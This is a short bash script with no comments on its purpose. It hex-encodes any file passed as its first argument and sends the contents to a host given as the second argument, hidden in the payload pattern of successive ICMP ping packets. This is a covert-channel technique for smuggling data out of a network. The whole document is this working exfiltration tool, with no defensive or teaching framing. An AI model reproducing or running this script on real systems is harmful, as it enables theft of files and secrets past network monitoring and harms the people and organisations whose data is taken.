StringZ=$(cat $1 | od -tx1 | cut -c8- | tr -d " " | tr -d "\n")
counter=0
#echo $StringZ
while(($counter<=${#StringZ}))
do
ping -c 1 -s 32 -p${StringZ:$counter:32} $2 && counter=$((counter+32))
done

